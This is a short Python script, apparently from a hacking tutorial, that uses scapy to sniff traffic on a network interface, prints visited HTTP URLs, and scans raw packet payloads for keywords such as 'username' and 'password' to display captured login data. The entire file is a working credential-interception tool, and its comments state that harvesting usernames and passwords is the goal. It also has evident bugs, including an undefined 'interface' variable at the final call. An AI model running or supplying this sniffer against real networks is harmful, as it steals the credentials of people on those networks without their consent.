import scapy.all as scapy
from scapy.layers import http

def sniff(interface):

    #prn = callback function to execute after sniffing recieved. -> also uses the parameter as packet recieved.
    #store = not to store the packets in memory - decrease load on computer.
    #filter = if not used then packets appear like gibberish -> uses berkelypacketfilter
          # = udp(image,video,audio,quicker than tcp), tcp , arp , based on ports(ftp-paswd on port-21 webservers on port-80)
          # Our goal - capture usernames and passwds from http - for that we need third party module >>>pip install scapy_http
          # After pip install from scapy.layers import http
    print("[+] Packet sniffing initiated with zero errors ->")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    #prn function - playspace to alter the packet_sniffed.


def get_url(packet):

    # Print URL visits.
    # host = field for 1st half of url | path : field for second half of url.
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url

def get_login_info(packet):

    # Only prints Raw layer and load field
    # reduces gibberish and gets only GET and POST(contain the login and password)requests. - displays layers [RAW] layer contains U&Pwd
    # check layers with haslayer(scapy.layername) print layer with print(packet[scapy.layername]) add .fieldname if needed.
    # P.S -> Most of the times load contains these fields but it can be accompanied by useless information hence we check particular string(keywords)
    load = packet[scapy.Raw].load
    keywords = ["username", "uname", "login", "email", "password", "pass"]
    for keyword in keywords:
        if keyword in load:
            return load


def process_sniffed_packet(packet):

    #if packet has layer and it is a http request haslayer-methodbyscapy_can check all layers tcp,ethernet etc.
    if packet.haslayer(http.HTTPRequest):
        #scapy doesnt have http filter so use import http from scapy.layers
        #to check with layers are accesible use print(packet.show())

        #URL PRINTING:
        url = get_url(packet)
        print("[+] HTTP Request detected >> : "+url)


    if packet.haslayer(scapy.Raw): #scapy has Raw layer prebuilt.

        login_info = get_login_info(packet)
        if login_info:
            print('\n\n' + 'Possible Username Password detected >>' + login_info + "\n\n")  # Prints important stuff.
                



#MAIN

#Program explaination

sniff(interface)